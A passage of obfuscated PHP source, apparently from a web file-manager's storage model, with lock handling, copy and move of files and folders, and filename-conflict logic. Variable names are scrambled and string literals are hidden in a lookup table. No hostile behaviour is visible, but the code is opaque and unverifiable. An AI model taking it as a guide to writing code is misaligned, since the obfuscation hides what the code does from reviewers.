$¿úÁıœ, $áøıïÏ£); $this->_lockEvent($¿úÁıœ, array($£¦òÃş[587], $£¦òÃş[588]), $áøıïÏ£); $this->_lockParent($¿úÁıœ, array($£¦òÃş[587], $£¦òÃş[589]), $áøıïÏ£); $this->_lockEvent($¿úÁıœ, array($£¦òÃş[594], $£¦òÃş[590], $£¦òÃş[591]), $áøıïÏ£); $this->_lockCheckEnd($£¦òÃş[589], $¿úÁıœ); } public function lockMoveEnd($»¶°ñÎ¡) { $À×¦†ğ =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $‰Ö³£Ì„ = 0; $this->_lockKey($À×¦†ğ[593] . $»¶°ñÎ¡, $‰Ö³£Ì„); $this->_lockEvent($»¶°ñÎ¡, array($À×¦†ğ[587], $À×¦†ğ[588]), $‰Ö³£Ì„); $this->_lockParent($»¶°ñÎ¡, array($À×¦†ğ[587], $À×¦†ğ[589]), $‰Ö³£Ì„); $this->_lockEvent($»¶°ñÎ¡, array($À×¦†ğ[594], $À×¦†ğ[590], $À×¦†ğ[591]), $‰Ö³£Ì„); } private function _lockCheck($”ºÕí, $‰·¹“ı˜) { $ÜøÍğ‹ =& $_SERVER[³½¬ÚË¯]; $¨êÓë€– = $this->sourceInfo($‰·¹“ı˜); $“éü’É = $”ºÕí . $ÜøÍğ‹[10] . $‰·¹“ı˜; $this->_lockTimeStart[$“éü’É] = timeFloat(); if (!is_array($¨êÓë€–)) { return; } $Î”™èå = LNG($ÜøÍğ‹[595]); CacheLock::setErrorMsg($ÜøÍğ‹[163] . htmlspecialchars($¨êÓë€–[$ÜøÍğ‹[32]]) . $ÜøÍğ‹[165] . $Î”™èå); $this->_lockKey($“éü’É, 1); $this->_lockKey($“éü’É, 0); $•ç£ÔåÉ = array_reverse($this->parentLevelArray($¨êÓë€–[$ÜøÍğ‹[554]])); foreach ($•ç£ÔåÉ as $ûş³ØĞ) { $“éü’É = $”ºÕí . $ÜøÍğ‹[596] . $ûş³ØĞ; if (CacheLock::lockGet($ÜøÍğ‹[597] . $“éü’É)) { $¨êÓë€– = $this->sourceInfo($ûş³ØĞ); CacheLock::setErrorMsg($ÜøÍğ‹[163] . htmlspecialchars($¨êÓë€–[$ÜøÍğ‹[32]]) . $ÜøÍğ‹[165] . $Î”™èå); $this->_lockKey($“éü’É, 1); $this->_lockKey($“éü’É, 0); } } } private function _lockCheckEnd($ÏÈŞÔÄ, $¿âÄŠ×) { $‹Å¿Ê  =& $_SERVER[³½¬ÚË¯]; $­Ëà¬›» = $ÏÈŞÔÄ . $‹Å¿Ê [10] . $¿âÄŠ×; CacheLock::setErrorMsg($‹Å¿Ê [422]); if (!isset($this->_lockTimeStart[$­Ëà¬›»])) { return; } $Êôñ÷ğ¯ = timeFloat() - $this->_lockTimeStart[$­Ëà¬›»]; unset($this->_lockTimeStart[$­Ëà¬›»]); if ($Êôñ÷ğ¯ > 0.5) { unset(self::$cacheSourceInfo[$‹Å¿Ê [501] . $¿âÄŠ×]); } $†áÁ†“Ö = $this->sourceInfo($¿âÄŠ×); if (!$†áÁ†“Ö) { show_json(LNG($‹Å¿Ê [105]), !1); } } private function _lockParent($¹ş‘íøâ, $ßû …Æ¢, $ºàÃöÓş) { if (!$this->autoLockSet) { return; } $ìÀÛüò = $this->sourceInfo($¹ş‘íøâ); if (!is_array($ìÀÛüò)) { return; } $‚¤ü¿†ø = array_reverse($this->parentLevelArray($ìÀÛüò[$_SERVER[³½¬ÚË¯][554]])); foreach ($‚¤ü¿†ø as $ê‡³‹İ) { $this->_lockEvent($ê‡³‹İ, $ßû …Æ¢, $ºàÃöÓş); } } private function _lockEvent($ô«×·¾, $–ÕüÂ”å, $»üÎâÚ‡) { $ùáĞ–¬» =& $_SERVER[³½¬ÚË¯]; if (!$this->autoLockSet) { return; } foreach ($–ÕüÂ”å as $”ÖÖÙ¯ö) { $ûç™Ç‡ = $”ÖÖÙ¯ö . $ùáĞ–¬»[10] . $ô«×·¾; if ($»üÎâÚ‡ && CacheLock::lockGet($ùáĞ–¬»[597] . $ûç™Ç‡)) { continue; } $this->_lockKey($ûç™Ç‡, $»üÎâÚ‡); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($“÷„¬öâ, $ñ­ò…À = 1) { $¾û¬¿–ç = $_SERVER[³½¬ÚË¯][597] . md5($“÷„¬öâ); if ($ñ­ò…À) { if (isset(self::$_lockItemArr[$¾û¬¿–ç])) { return; } self::$_lockItemArr[$¾û¬¿–ç] = 1; CacheLock::lock($¾û¬¿–ç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¾û¬¿–ç])) { return; } unset(self::$_lockItemArr[$¾û¬¿–ç]); CacheLock::unlock($¾û¬¿–ç); } } public function isParentOf($¾ª•İšå, $¹ˆ®ÌŸÂ) { $ï†¬ÒÏ» =& $_SERVER[³½¬ÚË¯]; $á˜êŠØŞ = $this->sourceInfo($¾ª•İšå); $Ì×ùúõÂ = $this->sourceInfo($¹ˆ®ÌŸÂ); $´â£ş±ğ = $á˜êŠØŞ[$ï†¬ÒÏ»[554]] . $á˜êŠØŞ[$ï†¬ÒÏ»[181]] . $ï†¬ÒÏ»[50]; $ƒ§¶„±§ = $Ì×ùúõÂ[$ï†¬ÒÏ»[554]] . $Ì×ùúõÂ[$ï†¬ÒÏ»[181]] . $ï†¬ÒÏ»[50]; $ôŠ²Ó« = strpos($ƒ§¶„±§, $´â£ş±ğ) === 0; return $ôŠ²Ó«; } private $targetIsDelete = 0; public function copy($Ã–¸½çò, $³Ëóˆ–‰, $¸¬á ôµ = REPEAT_REPLACE, $’ø¿„ªÀ = '') { $„É¤Á…÷ =& $_SERVER[³½¬ÚË¯]; $ùÀ¹ñ› = $this->sourceInfo($Ã–¸½çò); $º™áò‰û = $this->sourceInfo($³Ëóˆ–‰); if (!$ùÀ¹ñ› || !$º™áò‰û || $º™áò‰û[$„É¤Á…÷[453]] != $„É¤Á…÷[88]) { return !1; } if ($this->isParentOf($Ã–¸½çò, $³Ëóˆ–‰)) { return !1; } $ ÚãƒÁ = $’ø¿„ªÀ ? $’ø¿„ªÀ : $ùÀ¹ñ›[$„É¤Á…÷[32]]; $this->lockCopyStart($Ã–¸½çò); $this->lockWriteStart($³Ëóˆ–‰, $ ÚãƒÁ); $¶ í™´Æ = array($„É¤Á…÷[598] => array(), $„É¤Á…÷[599] => array(), $„É¤Á…÷[600] => array()); $this->targetIsDelete = intval($ùÀ¹ñ›[$„É¤Á…÷[473]]); $¶§ßÌù = $this->fileNameExistAuto($³Ëóˆ–‰, $ùÀ¹ñ›); $Ï¡å³¹³ = $this->_copy($Ã–¸½çò, $³Ëóˆ–‰, $¸¬á ôµ, $¶ í™´Æ, !0, $’ø¿„ªÀ); $this->_childrenListClear(); $this->lockCopyEnd($Ã–¸½çò); $this->lockWriteEnd($³Ëóˆ–‰, $ ÚãƒÁ); if ($ùÀ¹ñ›[$„É¤Á…÷[453]] == $„É¤Á…÷[88] && $¶§ßÌù == $Ï¡å³¹³) { $this->folderSizeResetChildren($¶§ßÌù); } Model($„É¤Á…÷[601])->addAll($¶ í™´Æ[$„É¤Á…÷[599]], array(), !0); if ($¶§ßÌù != $Ï¡å³¹³ || $ùÀ¹ñ›[$„É¤Á…÷[453]] == $„É¤Á…÷[88]) { Model($„É¤Á…÷[602])->eventCopy($Ï¡å³¹³); } $this->saveAll($¶ í™´Æ[$„É¤Á…÷[600]]); Model($„É¤Á…÷[214])->linkAdd($¶ í™´Æ[$„É¤Á…÷[598]]); $this->folderSizeReset($³Ëóˆ–‰); $this->updateModifyTime($³Ëóˆ–‰); return $Ï¡å³¹³; } private function _copy($ºÑ½à«í, $²ëªôÈ£, $¡é¥‹‚, &$Ë¿¦ÒÂ, $Ì§ä›¬Æ, $ë¯Â‘ı = '') { $»âµ†Ğğ =& $_SERVER[³½¬ÚË¯]; $ùáùÙ¹° = $this->sourceInfoCache($ºÑ½à«í); $¼Ê’‡ëƒ = $ùáùÙ¹°[$»âµ†Ğğ[453]] == $»âµ†Ğğ[88]; $«‚Æ¢òƒ = $ë¯Â‘ı ? $ë¯Â‘ı : $ùáùÙ¹°[$»âµ†Ğğ[32]]; $Ğˆ“ŞöÂ = $this->fileNameExistAuto($²ëªôÈ£, $ùáùÙ¹°); if ($Ì§ä›¬Æ) { $this->_childrenAllMake($ºÑ½à«í); if ($¼Ê’‡ëƒ && $Ğˆ“ŞöÂ) { $this->_childrenAllMake($Ğˆ“ŞöÂ); } } if (!$Ğˆ“ŞöÂ) { return $this->_copyCreate($ºÑ½à«í, $²ëªôÈ£, $«‚Æ¢òƒ, $Ë¿¦ÒÂ); } $óê¡È¼ = $Ğˆ“ŞöÂ; if ($¼Ê’‡ëƒ) { if ($¡é¥‹‚ == REPEAT_RENAME_FOLDER) { $«‚Æ¢òƒ = $this->fileNameAutoCache($²ëªôÈ£, $«‚Æ¢òƒ, $¡é¥‹‚, $¼Ê’‡ëƒ); $óê¡È¼ = $this->_copyCreate($ºÑ½à«í, $²ëªôÈ£, $«‚Æ¢òƒ, $Ë¿¦ÒÂ); } else { $¾Ğ¥ı¥ = $this->_childrenList($ºÑ½à«í); foreach ($¾Ğ¥ı¥ as $Ä÷èĞ§) { $this->_copy($Ä÷èĞ§[$»âµ†Ğğ[181]], $Ğˆ“ŞöÂ, $¡é¥‹‚, $Ë¿¦ÒÂ, !1); } } } else { if ($¡é¥‹‚ == REPEAT_RENAME || $¡é¥‹‚ == REPEAT_RENAME_FOLDER) { $«‚Æ¢òƒ = $this->fileNameAutoCache($²ëªôÈ£, $«‚Æ¢òƒ, $¡é¥‹‚, $¼Ê’‡ëƒ); $óê¡È¼ = $this->_copyCreate($ºÑ½à«í, $²ëªôÈ£, $«‚Æ¢òƒ, $Ë¿¦ÒÂ); } else { if ($¡é¥‹‚ == REPEAT_REPLACE) { $ £Åİ†˜ = $this->sourceInfoCache($Ğˆ“ŞöÂ); $ôõİòÑÜ = $this->fileHistory($ £Åİ†˜, $ùáùÙ¹°[$»âµ†Ğğ[509]], $ùáùÙ¹°[$»âµ†Ğğ[76]]); if ($ôõİòÑÜ) { $Ë¿¦ÒÂ[$»âµ†Ğğ[598]][] = $ùáùÙ¹°[$»âµ†Ğğ[509]]; } } else { if ($¡é¥‹‚ == REPEAT_SKIP) { } } } Hook::trigger($»âµ†Ğğ[603], array($»âµ†Ğğ[604], $ùáùÙ¹°, 0)); } return $óê¡È¼; } private function _copyCreate($÷—Ã®Ø, $×ŞëÚ‰Õ, $ğğ·¢¥, &$Ÿ‚°êÊï) { $ßŸŞŸ¯Ü =& $_SERVER[³½¬ÚË¯]; $¶ßƒš = $this->sourceInfoCache($÷—Ã®Ø); $¼»‚Í¦É = $this->sourceInfoCache($×ŞëÚ‰Õ); $êı¯ó¿£ = $this->_makeItemData($¶ßƒš, $¼»‚Í¦É, $ğğ·¢¥); Hook::trigger($ßŸŞŸ¯Ü[605], $êı¯ó¿£); Hook::trigger($ßŸŞŸ¯Ü[606], array($ßŸŞŸ¯Ü[607], $êı¯ó¿£, 0)); $Óšº½íà = $this->add($êı¯ó¿£); $…ÁìŞÇÏ = array($ßŸŞŸ¯Ü[181] => $Óšº½íà, $ßŸŞŸ¯Ü[32] => $ğğ·¢¥); $this->_copyApplyMeta($…ÁìŞÇÏ, $Ÿ‚°êÊï); if ($¶ßƒš[$ßŸŞŸ¯Ü[453]] != $ßŸŞŸ¯Ü[88]) { $Ÿ‚°êÊï[$ßŸŞŸ¯Ü[598]][] = $¶ßƒš[$ßŸŞŸ¯Ü[509]]; return $Óšº½íà; } $¥¿èô¥ = array(); $Û¡²»˜— = array(); $this->_childrenListAll($÷—Ã®Ø, $¥¿èô¥); $âéÖ¨î½ = count($¥¿èô¥); if ($âéÖ¨î½ == 0) { return $Óšº½íà; } $‹·Ä¯é˜ = $this->sourceInfo($Óšº½íà); foreach ($¥¿èô¥ as $¥âØá¬ã) { $¦¼ûÑØó = $this->_makeItemData($¥âØá¬ã, $‹·Ä¯é˜, $¥âØá¬ã[$ßŸŞŸ¯Ü[32]]); $¦¼ûÑØó[$ßŸŞŸ¯Ü[554]] = $¥âØá¬ã[$ßŸŞŸ¯Ü[554]]; $Û¡²»˜—[] = $¦¼ûÑØó; } $this->chunkEventSet($ßŸŞŸ¯Ü[608], array($ßŸŞŸ¯Ü[609], $êı¯ó¿£, $âéÖ¨î½)); $this->addAll($Û¡²»˜—, array(), !1); $¬Ï«ã¦¬ = $this->where(array($ßŸŞŸ¯Ü[180] => $Óšº½íà))->select(); $şÆÛ²ê’ = $this->_childrenMakeRelation($¥¿èô¥, $¬Ï«ã¦¬); $şÆÛ²ê’[$÷—Ã®Ø] = $Óšº½íà; $Ú¼€¸Æä = array(); $õæõ¾× = array(); foreach ($¬Ï«ã¦¬ as $¥âØá¬ã) { $”àãî‚Ì = $¥âØá¬ã[$ßŸŞŸ¯Ü[181]]; $´›è”§º = $this->_childrenMatch($şÆÛ²ê’, $¥âØá¬ã, $‹·Ä¯é˜); $Ú¼€¸Æä[] = array($ßŸŞŸ¯Ü[181], $”àãî‚Ì, $ßŸŞŸ¯Ü[180], $´›è”§º[$ßŸŞŸ¯Ü[180]]); $õæõ¾×[] = array($ßŸŞŸ¯Ü[181], $”àãî‚Ì, $ßŸŞŸ¯Ü[554], $´›è”§º[$ßŸŞŸ¯Ü[554]]); $this->_copyApplyMeta($¥âØá¬ã, $Ÿ‚°êÊï); if ($¥âØá¬ã[$ßŸŞŸ¯Ü[453]] != $ßŸŞŸ¯Ü[88]) { $Ÿ‚°êÊï[$ßŸŞŸ¯Ü[598]][] = $¥âØá¬ã[$ßŸŞŸ¯Ü[509]]; } } $this->chunkEventSet($ßŸŞŸ¯Ü[610], array($ßŸŞŸ¯Ü[611], $êı¯ó¿£, $âéÖ¨î½)); $this->saveAll($Ú¼€¸Æä); $this->chunkEventSet($ßŸŞŸ¯Ü[612], array($ßŸŞŸ¯Ü[613], $êı¯ó¿£, $âéÖ¨î½)); $this->saveAll($õæõ¾×); return $Óšº½íà; } private function _childrenMakeRelation($®±ı„™ˆ, $£¬Ò©Èó) { $ğ®Ö°±Œ =& $_SERVER[³½¬ÚË¯]; $Î®üÆ¿ì = array(); $ŞÇ˜ü­õ = array(); foreach ($®±ı„™ˆ as $ø§ğ“Ô¸) { $Öğ”ï¿ = $ø§ğ“Ô¸[$ğ®Ö°±Œ[32]] . $ğ®Ö°±Œ[8] . $ø§ğ“Ô¸[$ğ®Ö°±Œ[554]]; $Î®üÆ¿ì[$Öğ”ï¿] = $ø§ğ“Ô¸[$ğ®Ö°±Œ[181]]; } foreach ($£¬Ò©Èó as $ø§ğ“Ô¸) { $Öğ”ï¿ = $ø§ğ“Ô¸[$ğ®Ö°±Œ[32]] . $ğ®Ö°±Œ[8] . $ø§ğ“Ô¸[$ğ®Ö°±Œ[554]]; $âùÌÃÖ£ = $Î®üÆ¿ì[$Öğ”ï¿]; $ŞÇ˜ü­õ[$âùÌÃÖ£] = $ø§ğ“Ô¸[$ğ®Ö°±Œ[181]]; } return $ŞÇ˜ü­õ; } private function _childrenMatch($¨†¤öà¬, $ìÒœÀ›ì, $øÓÔì¢Ö) { $‚ÅÊÍ =& $_SERVER[³½¬ÚË¯]; $ºîí¢º = $øÓÔì¢Ö[$‚ÅÊÍ[554]]; $Õì®½Å€ = $this->parentLevelArray($ìÒœÀ›ì[$‚ÅÊÍ[554]]); foreach ($Õì®½Å€ as $ŸŞ–ÍÜ) { if (isset($¨†¤öà¬[$ŸŞ–ÍÜ])) { $ºîí¢º .= $¨†¤öà¬[$ŸŞ–ÍÜ] . $‚ÅÊÍ[614]; } } $ºîí¢º = rtrim($ºîí¢º, $‚ÅÊÍ[50]) . $‚ÅÊÍ[50]; $Ø¤’Ñ = $this->parentLevelArray($ºîí¢º); $–ŞÜ…äì = $Ø¤’Ñ[count($Ø¤’Ñ) - 1]; return array($‚ÅÊÍ[180] => $–ŞÜ…äì, $‚ÅÊÍ[554] => $ºîí¢º); } private function _makeItemData($­Ú‚–Ò, $­ì÷şúú, $†‘—ÍÕ) { $÷õñÍÜä =& $_SERVER[³½¬ÚË¯]; $‰ŞÓè¦ = array($÷õñÍÜä[615] => $­Ú‚–Ò[$÷õñÍÜä[453]], $÷õñÍÜä[462] => $†‘—ÍÕ, $÷õñÍÜä[616] => $­Ú‚–Ò[$÷õñÍÜä[454]] ? $­Ú‚–Ò[$÷õñÍÜä[454]] : $÷õñÍÜä[12], $÷õñÍÜä[510] => $­Ú‚–Ò[$÷õñÍÜä[509]] ? $­Ú‚–Ò[$÷õñÍÜä[509]] : 0, $÷õñÍÜä[586] => $­Ú‚–Ò[$÷õñÍÜä[76]] ? $­Ú‚–Ò[$÷õñÍÜä[76]] : 0, $÷õñÍÜä[617] => intval($­ì÷şúú[$÷õñÍÜä[178]]), $÷õñÍÜä[618] => intval($­ì÷şúú[$÷õñÍÜä[539]]), $÷õñÍÜä[619] => intval(USER_ID), $÷õñÍÜä[620] => intval(USER_ID), $÷õñÍÜä[445] => intval($­ì÷şúú[$÷õñÍÜä[181]]), $÷õñÍÜä[621] => $­ì÷şúú[$÷õñÍÜä[554]] . $­ì÷şúú[$÷õñÍÜä[181]] . $÷õñÍÜä[50], $÷õñÍÜä[466] => $­Ú‚–Ò[$÷õñÍÜä[85]] ? $­Ú‚–Ò[$÷õñÍÜä[85]] : time(), $÷õñÍÜä[472] => 0, $÷õñÍÜä[622] => $÷õñÍÜä[12]); return $‰ŞÓè¦; } private function _copyApplyMeta($¬Æî…Ï, &$§ñ«¿Òë) { $ÜÙÜ¹Ï˜ =& $_SERVER[³½¬ÚË¯]; $Ä·ıŸ»Š = $¬Æî…Ï[$ÜÙÜ¹Ï˜[181]]; $ØÀÃåİ = $¬Æî…Ï[$ÜÙÜ¹Ï˜[32]]; if (!isset($¬Æî…Ï[$ÜÙÜ¹Ï˜[623]]) || !$¬Æî…Ï[$ÜÙÜ¹Ï˜[623]] || $¬Æî…Ï[$ÜÙÜ¹Ï˜[623]] == $ÜÙÜ¹Ï˜[212]) { $§ñ«¿Òë[$ÜÙÜ¹Ï˜[600]][] = array($ÜÙÜ¹Ï˜[181], $Ä·ıŸ»Š, $ÜÙÜ¹Ï˜[623], short_id($Ä·ıŸ»Š)); } if (Input::check($ØÀÃåİ, $ÜÙÜ¹Ï˜[624])) { $§ñ«¿Òë[$ÜÙÜ¹Ï˜[599]][] = array($ÜÙÜ¹Ï˜[181] => $Ä·ıŸ»Š, $ÜÙÜ¹Ï˜[94] => $ÜÙÜ¹Ï˜[506], $ÜÙÜ¹Ï˜[418] => str_replace($ÜÙÜ¹Ï˜[53], $ÜÙÜ¹Ï˜[12], Pinyin::get($ØÀÃåİ))); $§ñ«¿Òë[$ÜÙÜ¹Ï˜[599]][] = array($ÜÙÜ¹Ï˜[181] => $Ä·ıŸ»Š, $ÜÙÜ¹Ï˜[94] => $ÜÙÜ¹Ï˜[505], $ÜÙÜ¹Ï˜[418] => Pinyin::get($ØÀÃåİ, $ÜÙÜ¹Ï˜[625])); } $§ñ«¿Òë[$ÜÙÜ¹Ï˜[599]][] = array($ÜÙÜ¹Ï˜[181] => $Ä·ıŸ»Š, $ÜÙÜ¹Ï˜[94] => $ÜÙÜ¹Ï˜[485], $ÜÙÜ¹Ï˜[418] => KodSort::makeStr($ØÀÃåİ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÆšÑÒª•) { $”ã‚ƒÇ =& $_SERVER[³½¬ÚË¯]; $©ÑğÕù” = $this->sourceInfo($ÆšÑÒª•); $¡¸›ßİ½ = $”ã‚ƒÇ[626]; $äÌÌÑ€ú = array($”ã‚ƒÇ[554] => array($”ã‚ƒÇ[581], $©ÑğÕù”[$”ã‚ƒÇ[554]] . $ÆšÑÒª• . $”ã‚ƒÇ[582]), $”ã‚ƒÇ[473] => $this->targetIsDelete); $¬€—ıß” = $this->field($¡¸›ßİ½)->where($äÌÌÑ€ú)->select(); if (!$¬€—ıß”) { return; } $¬€—ıß” = array_to_keyvalue($¬€—ıß”, $”ã‚ƒÇ[181]); foreach ($¬€—ıß” as $Ö‚Š¶) { $‚ÏçÅâÇ = $Ö‚Š¶[$”ã‚ƒÇ[180]]; $ÆšÑÒª• = $Ö‚Š¶[$”ã‚ƒÇ[181]]; if (!isset($this->_childrenListCache[$ÆšÑÒª•]) && $Ö‚Š¶[$”ã‚ƒÇ[453]] == $”ã‚ƒÇ[88]) { $this->_childrenListCache[$ÆšÑÒª•] = array(); } if (!isset($this->_childrenListCache[$‚ÏçÅâÇ])) { $this->_childrenListCache[$‚ÏçÅâÇ] = array(); } $this->_childrenListCache[$‚ÏçÅâÇ][$ÆšÑÒª•] = $Ö‚Š¶; $this->_childrenItemCache[$ÆšÑÒª•] = $Ö‚Š¶; } } private function _childrenListAll($Ì·×ş¶, &$’ÙŠå“Ë) { $¼Á˜›†º =& $_SERVER[³½¬ÚË¯]; if (!isset($this->_childrenListCache[$Ì·×ş¶])) { return; } $¢–ãè¢­ = $this->_childrenListCache[$Ì·×ş¶]; foreach ($¢–ãè¢­ as $•³©çÊ­ => $Ÿ®î·´) { $’ÙŠå“Ë[$•³©çÊ­] = $Ÿ®î·´; if ($Ÿ®î·´[$¼Á˜›†º[453]] == $¼Á˜›†º[88]) { $this->_childrenListAll($•³©çÊ­, $’ÙŠå“Ë); } } } private function sourceInfoCache($«ğ¸é¨á) { if (isset($this->_childrenItemCache[$«ğ¸é¨á])) { return $this->_childrenItemCache[$«ğ¸é¨á]; } return $this->sourceInfo($«ğ¸é¨á); } private function _childrenList($ì†¿²¿) { if (isset($this->_childrenListCache[$ì†¿²¿])) { return $this->_childrenListCache[$ì†¿²¿]; } return $this->_childrenListSelect($ì†¿²¿); } private function _childrenListSelect($şÄ¯ìÈ÷) { $¶´«˜É– =& $_SERVER[³½¬ÚË¯]; $ü²ÈØáë = array($¶´«˜É–[180] => $şÄ¯ìÈ÷, $¶´«˜É–[473] => $this->targetIsDelete); $íí§ÉÎè = $this->where($ü²ÈØáë)->select(); $íí§ÉÎè = $íí§ÉÎè ? $íí§ÉÎè : array(); $­ñ ¥å = array_to_keyvalue($íí§ÉÎè, $¶´«˜É–[181]); $this->_childrenListCache[$şÄ¯ìÈ÷] = $­ñ ¥å; foreach ($­ñ ¥å as $şÄ¯ìÈ÷ => $ë¡¸ƒ¯¸) { $this->_childrenItemCache[$şÄ¯ìÈ÷] = $ë¡¸ƒ¯¸; } return $­ñ ¥å; } private function fileNameExistAuto($©ıª¾Ï, $—ŞÎò¨Í) { $¹™Î¦¸“ =& $_SERVER[³½¬ÚË¯]; if ($—ŞÎò¨Í[$¹™Î¦¸“[473]] == $¹™Î¦¸“[88]) { return $this->fileNameExist($©ıª¾Ï, $—ŞÎò¨Í[$¹™Î¦¸“[32]]); } return $this->fileNameExistCache($©ıª¾Ï, $—ŞÎò¨Í[$¹™Î¦¸“[32]]); } private function fileNameExistCache($Ö›…´øÎ, $è¬Ñ˜¤Õ) { $¶Ö°ĞÙ¨ =& $_SERVER[³½¬ÚË¯]; $è¬Ñ˜¤Õ = strtolower($è¬Ñ˜¤Õ); $Ñ¡¹³’¹ = $this->_childrenList($Ö›…´øÎ); foreach ($Ñ¡¹³’¹ as $í¤«Ëûé) { if ($è¬Ñ˜¤Õ == strtolower($í¤«Ëûé[$¶Ö°ĞÙ¨[32]])) { return $í¤«Ëûé[$¶Ö°ĞÙ¨[181]]; } } return !1; } private function fileNameAutoCache($Êı½ÚäÅ, $ÒÁ¸€Ç‹, $áÉáæ¥½, $™­º…°¥) { $Ã‘÷ŸÑë =& $_SERVER[³½¬ÚË¯]; $‹ˆŞ‚’ì = $this->_childrenList($Êı½ÚäÅ); $à÷ŠÓÉÜ = array_to_keyvalue($‹ˆŞ‚’ì, $Ã‘÷ŸÑë[12], $Ã‘÷ŸÑë[32]); return $this->fileNameAutoGet($à÷ŠÓÉÜ, $ÒÁ¸€Ç‹, $áÉáæ¥½, $™­º…°¥); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($øîÌ°·, $ï›ÀÏ«ª, $Îµ€ç¤— = REPEAT_REPLACE, $£Æ¡´± = '') { $‹å¾Ÿ¢ğ =& $_SERVER[³½¬ÚË¯]; $ñ™®˜‡İ = $this->sourceInfo($øîÌ°·); $üíÇ†íá = $this->sourceInfo($ï›ÀÏ«ª); if ($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[180]] == $üíÇ†íá[$‹å¾Ÿ¢ğ[181]]) { if ($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[473]] == $‹å¾Ÿ¢ğ[88]) { Model($‹å¾Ÿ¢ğ[471])->restore(array($øîÌ°·)); } if (!$£Æ¡´± || $£Æ¡´± == $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[32]]) { return $øîÌ°·; } } $˜ùŞ›˜Î = $this->pathInfoMore($øîÌ°·); if ($this->isParentOf($øîÌ°·, $ï›ÀÏ«ª)) { return !1; } if (!$ñ™®˜‡İ || !$üíÇ†íá || $üíÇ†íá[$‹å¾Ÿ¢ğ[453]] != $‹å¾Ÿ¢ğ[88]) { return !1; } Hook::trigger($‹å¾Ÿ¢ğ[627], $˜ùŞ›˜Î); $this->targetIsDelete = intval($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[473]]); if ($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[180]] == $ï›ÀÏ«ª && $£Æ¡´± != $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[32]]) { $Üïş´´« = $this->fileNameExist($ï›ÀÏ«ª, $£Æ¡´±); if ($Üïş´´« && $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[453]] == $‹å¾Ÿ¢ğ[212]) { $Ëíß³í£ = $this->sourceInfo($Üïş´´«); $Ÿ©ä«ü = $this->fileHistory($Ëíß³í£, $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[509]], $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[76]]); if (!$Ÿ©ä«ü) { Model($‹å¾Ÿ¢ğ[512])->remove($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[509]]); } $this->removeNow($øîÌ°·, !1); $this->folderSizeReset($ï›ÀÏ«ª); Hook::trigger($‹å¾Ÿ¢ğ[628], $˜ùŞ›˜Î); return $Üïş´´«; } } $Æ ûóú = $£Æ¡´± ? $£Æ¡´± : $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[32]]; $this->lockMoveStart($øîÌ°·); $this->lockWriteStart($ï›ÀÏ«ª, $Æ ûóú); $ß«­ÙÚ‚ = array($‹å¾Ÿ¢ğ[598] => array(), $‹å¾Ÿ¢ğ[629] => !1); $this->clearShare($øîÌ°·, $ï›ÀÏ«ª); $î‘ÎÀ¿± = $this->fileNameExistAuto($ï›ÀÏ«ª, $ñ™®˜‡İ); $»–Â¸Ÿ… = $this->_move($øîÌ°·, $ï›ÀÏ«ª, $Îµ€ç¤—, $ß«­ÙÚ‚, $£Æ¡´±); $this->sourceCacheClear(); if ($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[453]] == $‹å¾Ÿ¢ğ[88] && $î‘ÎÀ¿±) { $this->folderSizeResetChildren($»–Â¸Ÿ…); } Model($‹å¾Ÿ¢ğ[214])->linkAdd($ß«­ÙÚ‚[$‹å¾Ÿ¢ğ[598]]); if ($î‘ÎÀ¿± && $ß«­ÙÚ‚[$‹å¾Ÿ¢ğ[629]]) { $this->removeNow($øîÌ°·, !1); } $this->lockMoveEnd($øîÌ°·); $this->lockWriteEnd($ï›ÀÏ«ª, $Æ ûóú); $this->folderSizeReset($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[180]]); $this->folderSizeReset($ï›ÀÏ«ª); $üß¯‰®µ = array($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[180]], $ï›ÀÏ«ª); if ($ñ™®˜‡İ[$‹å¾Ÿ¢ğ[453]] == $‹å¾Ÿ¢ğ[88]) { $üß¯‰®µ[] = $øîÌ°·; } $this->updateModifyTime($üß¯‰®µ); Model($‹å¾Ÿ¢ğ[602])->eventMove($øîÌ°·, $ñ™®˜‡İ[$‹å¾Ÿ¢ğ[180]], $ï›ÀÏ«ª); Hook::trigger($‹å¾Ÿ¢ğ[628], $˜ùŞ›˜Î); return $»–Â¸Ÿ…; } private function _move($•Åƒñë«, $ÄÖ±Á, $„†™Ñ€”, &$ÛŠôã İ, $š·œùñ = '') { $ÅÇ‚”•° =& $_SERVER[³½¬ÚË¯]; $ñÍ‡ùñÇ = $this->sourceInfo($•Åƒñë«); $ãöÏæØ = $ñÍ‡ùñÇ[$ÅÇ‚”•°[453]] == $ÅÇ‚”•°[88]; $öëœÖÓ = $š·œùñ ? $š·œùñ : $ñÍ‡ùñÇ[$ÅÇ‚”•°[32]]; $à§Á­ì = $this->fileNameExistAuto($ÄÖ±Á, $ñÍ‡ùñÇ); $this->lockMoveStart($•Åƒñë«); $this->lockWriteStart($ÄÖ±Á, $öëœÖÓ); if (!$à§Á­ì) { return $this->_moveForce($•Åƒñë«, $ÄÖ±Á, $öëœÖÓ); } $ÂÈ¡ÅÍˆ = $à§Á­ì; $æ´Ûº = !1; if ($ãöÏæØ) { if ($„†™Ñ€” == REPEAT_RENAME_FOLDER) { $öëœÖÓ = $this->fileNameAuto($ÄÖ±Á, $öëœÖÓ, $„†™Ñ€”, $ãöÏæØ); $ÂÈ¡ÅÍˆ = $this->_moveForce($•Åƒñë«, $ÄÖ±Á, $öëœÖÓ); } else { if ($„†™Ñ€” == REPEAT_RENAME_FOLDER) { 